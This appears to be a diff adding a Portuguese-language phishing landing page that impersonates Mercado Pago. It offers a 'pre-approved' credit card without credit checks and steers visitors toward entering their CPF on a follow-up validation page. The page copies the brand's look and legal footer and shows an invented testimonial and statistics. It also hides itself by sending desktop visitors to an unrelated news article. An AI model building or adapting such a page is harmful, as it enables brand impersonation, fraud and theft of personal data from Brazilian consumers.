@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Cartão de Crédito Pré-aprovado - mercado</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #EEEEEE;
+        }
+
+        /* Animações */
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(52, 131, 250, 0.7);
+            }
+
+            70% {
+                transform: scale(1.02);
+                box-shadow: 0 0 0 10px rgba(52, 131, 250, 0);
+            }
+
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(52, 131, 250, 0);
+            }
+        }
+
+        .btn-pulse {
+            animation: pulse 2s infinite;
+        }
+
+        .btn-shine {
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-shine:after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(to right,
+                    rgba(255, 255, 255, 0) 0%,
+                    rgba(255, 255, 255, 0.3) 50%,
+                    rgba(255, 255, 255, 0) 100%);
+            transform: rotate(30deg);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% {
+                left: -100%;
+                opacity: 0;
+            }
+
+            50% {
+                left: 100%;
+                opacity: 1;
+            }
+
+            100% {
+                left: 100%;
+                opacity: 0;
+            }
+        }
+
+        /* Cards */
+        .card {
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            transition: all 0.3s ease;
+        }
+
+        .card:hover {
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .bg-primary {
+            background-color: #3483FA;
+        }
+
+        /* Ícones */
+        .icon-circle {
+            width: 48px;
+            height: 48px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+        }
+
+        /* Carrossel */
+        .carousel-item {
+            display: none;
+        }
+
+        .carousel-item.active {
+            display: block;
+        }
+
+        .carousel-img {
+            max-width: 100%;
+            height: 280px;
+            object-fit: cover;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Steps */
+        .step {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            border: 2px solid #EDEDED;
+            color: #999;
+            background: white;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .step.active {
+            border-color: #3483FA;
+            background: #3483FA;
+            color: white;
+        }
+
+        .step-line {
+            flex: 1;
+            height: 3px;
+            background: #EDEDED;
+            margin: 0 10px;
+        }
+
+        .step-line.active {
+            background: #3483FA;
+        }
+
+        /* Responsividade */
+        @media (max-width: 480px) {
+            .carousel-img {
+                height: 240px;
+            }
+
+            .icon-circle {
+                width: 44px;
+                height: 44px;
+            }
+        }
+    </style>
+
+    <!-- Pixel Facebook 1 -->
+    <script>
+        window.pixelId = "6a184246f1f2699f88b3ab4b";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <!-- Pixel Facebook 2 -->
+    <script>
+        window.pixelId = "699511958e254c5ebc775636";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <!-- Pixel UTMify -->
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids async defer></script>
+
+    <!-- Pixel Google (adicionado sem interferir nos pixels existentes) -->
+    <script>
+        window.googlePixelId = "6a1ecf677f95f02e48c8cff3";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+        document.head.appendChild(a);
+    </script>
+
+    <script type="text/javascript">
+        if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+            window.location.replace('https://mundologistica.com.br/noticias/shopee-amplia-entregas-com-mais-de-2-mil-pontos-de-retirada');
+        }
+    </script>
+</head>
+
+<body class="bg-[#EEEEEE]">
+    <div class="max-w-md mx-auto min-h-screen bg-white relative">
+
+        <!-- Hero Section -->
+        <div class="relative">
+            <div class="bg-[#FFE600] w-full flex items-center justify-center">
+                <img src="https://i.postimg.cc/PfgQ82jx/Design-sem-nome-(37).png" alt="Mercado Pago Card"
+                    class="w-full object-contain">
+            </div>
+        </div>
+
+        <!-- Card de Vantagens -->
+        <div class="px-4 mt-4 relative z-10">
+            <div class="bg-white card p-6">
+                <h2 class="text-xl font-semibold text-gray-800 mb-6 text-center">Vantagens exclusivas</h2>
+
+                <div class="space-y-4">
+                    <div class="flex items-center bg-blue-50 p-4 rounded-lg">
+                        <div class="bg-[#3483FA] text-white icon-circle mr-4">
+                            <i class="fas fa-bolt text-lg"></i>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold text-gray-800">Crédito na hora</h3>
+                            <p class="text-sm text-gray-600">Para usar onde e quando quiser!</p>
+                        </div>
+                    </div>
+
+                    <div class="flex items-center bg-[#FFF8E1] p-4 rounded-lg">
+                        <div class="bg-[#FFE600] text-[#333333] icon-circle mr-4">
+                            <i class="fas fa-shield-alt text-lg"></i>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold text-gray-800">Sem burocracia</h3>
+                            <p class="text-sm text-gray-600">Sem consulta ao SPC/Serasa.</p>
+                        </div>
+                    </div>
+
+                    <div class="flex items-center bg-green-50 p-4 rounded-lg">
+                        <div class="bg-[#00A650] text-white icon-circle mr-4">
+                            <i class="fas fa-credit-card text-lg"></i>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold text-gray-800">Cartão para seu dia a dia</h3>
+                            <p class="text-sm text-gray-600">Use em lojas físicas e online.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Botão Principal -->
+                <button id="btnSolicitar"
+                    class="w-full bg-[#3483FA] hover:bg-[#2968C8] text-white text-lg font-semibold py-4 rounded-md mt-6 btn-pulse btn-shine transition-all duration-300">
+                    Solicitar meu cartão agora
+                </button>
+
+                <!-- Segurança -->
+                <div class="flex items-center justify-center mt-4 pt-4 border-t border-gray-100 text-gray-600">
+                    <i class="fas fa-lock mr-2 text-[#00A650]"></i>
+                    <span class="text-sm">Seus dados estão protegidos e seguros</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Como Solicitar -->
+        <div class="px-4 mt-6">
+            <div class="bg-white card p-6">
+                <h2 class="text-xl font-semibold text-gray-800 mb-6 text-center">Como Solicitar?</h2>
+
+                <!-- Steps -->
+                <div class="flex items-center justify-between mb-6">
+                    <div class="step active">1</div>
+                    <div class="step-line active"></div>
+                    <div class="step">2</div>
+                    <div class="step-line"></div>
+                    <div class="step">3</div>
+                </div>
+
+                <!-- Carrossel -->
+                <div class="relative">
+                    <div class="carousel-item active">
+                        <div class="text-center">
+                            <div class="bg-gray-50 rounded-lg p-4 mb-4">
+                                <img src="https://i.postimg.cc/90tYKgYq/1.jpg" alt="Etapa 1"
+                                    class="carousel-img mx-auto">
+                            </div>
+                            <p class="text-gray-800 font-medium">
+                                <span class="font-bold">1.</span> Preencha seu CPF para consultar seu limite de cartão
+                                pré-aprovado
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="carousel-item">
+                        <div class="text-center">
+                            <div class="bg-gray-50 rounded-lg p-4 mb-4">
+                                <img src="https://i.postimg.cc/g0CyJbMp/2.jpg" alt="Etapa 2"
+                                    class="carousel-img mx-auto">
+                            </div>
+                            <p class="text-gray-800 font-medium">
+                                <span class="font-bold">2.</span> Escolha seu modelo de cartão e forma de envio
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="carousel-item">
+                        <div class="text-center">
+                            <div class="bg-gray-50 rounded-lg p-4 mb-4">
+                                <img src="https://i.postimg.cc/8kBd13Lf/3.jpg" alt="Etapa 3"
+                                    class="carousel-img mx-auto">
+                            </div>
+                            <p class="text-gray-800 font-medium">
+                                <span class="font-bold">3.</span> Receba seu cartão no conforto de casa e comece a usar
+                            </p>
+                        </div>
+                    </div>
+
+                    <!-- Navegação do carrossel -->
+                    <button id="prevBtn"
+                        class="absolute left-2 top-1/2 transform -translate-y-1/2 bg-white rounded-full w-10 h-10 flex items-center justify-center shadow-lg text-[#3483FA] hover:bg-blue-50">
+                        <i class="fas fa-chevron-left"></i>
+                    </button>
+                    <button id="nextBtn"
+                        class="absolute right-2 top-1/2 transform -translate-y-1/2 bg-white rounded-full w-10 h-10 flex items-center justify-center shadow-lg text-[#3483FA] hover:bg-blue-50">
+                        <i class="fas fa-chevron-right"></i>
+                    </button>
+                </div>
+
+                <!-- Indicadores -->
+                <div class="flex justify-center mt-4 space-x-2">
+                    <div class="w-2 h-2 rounded-full bg-primary" data-indicator="0"></div>
+                    <div class="w-2 h-2 rounded-full bg-gray-300" data-indicator="1"></div>
+                    <div class="w-2 h-2 rounded-full bg-gray-300" data-indicator="2"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Estatísticas -->
+        <div class="px-4 mt-6">
+            <div class="bg-white card p-6 flex justify-between text-center">
+                <div>
+                    <p class="text-2xl font-bold text-[#3483FA]">+500mil</p>
+                    <p class="text-xs text-gray-600">Clientes</p>
+                </div>
+                <div>
+                    <p class="text-2xl font-bold text-[#3483FA]">4.8/5</p>
+                    <p class="text-xs text-gray-600">Avaliação</p>
+                </div>
+                <div>
+                    <p class="text-2xl font-bold text-[#3483FA]">5 min</p>
+                    <p class="text-xs text-gray-600">Aprovação</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Ver Limite -->
+        <div class="px-4 mt-6">
+            <button id="btnVerLimite" class="bg-white card p-4 w-full flex items-center justify-between">
+                <div class="flex items-center">
+                    <div class="bg-blue-50 icon-circle mr-3">
+                        <i class="fas fa-calculator text-[#3483FA]"></i>
+                    </div>
+                    <div class="text-left">
+                        <p class="font-semibold text-gray-800">Ver Limite Disponível</p>
+                        <p class="text-sm text-gray-600">Descubra qual limite está liberado para você</p>
+                    </div>
+                </div>
+                <i class="fas fa-chevron-right text-[#3483FA]"></i>
+            </button>
+        </div>
+
+        <!-- Depoimentos -->
+        <div class="px-4 mt-6 mb-8">
+            <div class="bg-white card p-6">
+                <div class="flex items-center mb-4">
+                    <div class="bg-blue-50 rounded-full p-2 mr-3">
+                        <i class="fas fa-quote-right text-[#3483FA]"></i>
+                    </div>
+                    <p class="font-semibold text-gray-800">O que dizem nossos clientes</p>
+                </div>
+
+                <div class="border-l-4 border-[#3483FA] pl-4">
+                    <p class="text-gray-700 italic mb-2">
+                        "Processo super rápido, meu cartão chegou rapidinho e já veio com limite liberado! Recomendo!"
+                    </p>
+                    <div class="flex items-center">
+                        <p class="text-sm font-semibold text-gray-800 mr-2">Mariana S.</p>
+                        <div class="flex text-yellow-400">
+                            <i class="fas fa-star text-xs"></i>
+                            <i class="fas fa-star text-xs"></i>
+                            <i class="fas fa-star text-xs"></i>
+                            <i class="fas fa-star text-xs"></i>
+                            <i class="fas fa-star text-xs"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="px-4 pb-6">
+            <div class="text-center text-xs text-gray-500">
+                <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
+                <p>CNPJ: 10.573.521/0001-91</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // =======================================================
+        // SISTEMA DE PASSAGEM DE PARÂMETROS URL - ADICIONADO
+        // =======================================================
+        
+        // Função para capturar parâmetros da URL
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        // Função para construir URL com parâmetros
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location.href);
+            
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            return url.toString();
+        }
+
+        // Debug: Mostrar parâmetros atuais
+        console.log('Parâmetros atuais da página:', getUrlParams());
+
+        // =======================================================
+        // CARROSSEL
+        // =======================================================
+        
+        let currentStep = 0;
+        const maxSteps = 3;
+        const carouselItems = document.querySelectorAll('.carousel-item');
+        const indicators = document.querySelectorAll('[data-indicator]');
+
+        function updateCarousel(stepIndex) {
+            carouselItems.forEach((item, index) => {
+                item.classList.toggle('active', index === stepIndex);
+            });
+
+            indicators.forEach((indicator, index) => {
+                indicator.classList.toggle('bg-primary', index === stepIndex);
+                indicator.classList.toggle('bg-gray-300', index !== stepIndex);
+            });
+
+            // Update steps
+            document.querySelectorAll('.step').forEach((step, index) => {
+                step.classList.toggle('active', index <= stepIndex);
+            });
+            document.querySelectorAll('.step-line').forEach((line, index) => {
+                line.classList.toggle('active', index < stepIndex);
+            });
+        }
+
+        function nextStep() {
+            currentStep = (currentStep + 1) % maxSteps;
+            updateCarousel(currentStep);
+        }
+
+        function prevStep() {
+            currentStep = (currentStep - 1 + maxSteps) % maxSteps;
+            updateCarousel(currentStep);
+        }
+
+        function redirectToPage(page) {
+            const nextPageUrl = buildUrlWithParams(page);
+            console.log('Redirecionando para:', nextPageUrl);
+            
+            setTimeout(() => {
+                window.location.href = nextPageUrl;
+            }, 100);
+        }
+
+        // =======================================================
+        // INICIALIZAÇÃO
+        // =======================================================
+        
+        document.addEventListener('DOMContentLoaded', function () {
+            console.log('Página carregada - parâmetros preservados:', getUrlParams());
+
+            // Carrossel
+            const nextBtn = document.getElementById('nextBtn');
+            const prevBtn = document.getElementById('prevBtn');
+            
+            if (nextBtn) nextBtn.addEventListener('click', nextStep);
+            if (prevBtn) prevBtn.addEventListener('click', prevStep);
+
+            // Auto-play
+            let autoPlay = setInterval(nextStep, 5000);
+
+            [prevBtn, nextBtn].forEach(btn => {
+                if (btn) {
+                    btn.addEventListener('click', () => {
+                        clearInterval(autoPlay);
+                        setTimeout(() => {
+                            autoPlay = setInterval(nextStep, 5000);
+                        }, 10000);
+                    });
+                }
+            });
+
+            // Botão Solicitar
+            const btnSolicitar = document.getElementById('btnSolicitar');
+            if (btnSolicitar) {
+                btnSolicitar.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    redirectToPage('validacao.html');
+                });
+            }
+
+            // Botão Ver Limite
+            const btnVerLimite = document.getElementById('btnVerLimite');
+            if (btnVerLimite) {
+                btnVerLimite.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    redirectToPage('2.html');
+                });
+            }
+
+            // Indicadores clicáveis
+            indicators.forEach((indicator, index) => {
+                indicator.addEventListener('click', () => {
+                    currentStep = index;
+                    updateCarousel(currentStep);
+                    clearInterval(autoPlay);
+                    setTimeout(() => {
+                        autoPlay = setInterval(nextStep, 5000);
+                    }, 10000);
+                });
+            });
+
+            // Steps clicáveis
+            document.querySelectorAll('.step').forEach((step, index) => {
+                step.addEventListener('click', () => {
+                    currentStep = index;
+                    updateCarousel(currentStep);
+                    clearInterval(autoPlay);
+                    setTimeout(() => {
+                        autoPlay = setInterval(nextStep, 5000);
+                    }, 10000);
+                });
+            });
+        });
+    </script>
+</body>
+
+</html>
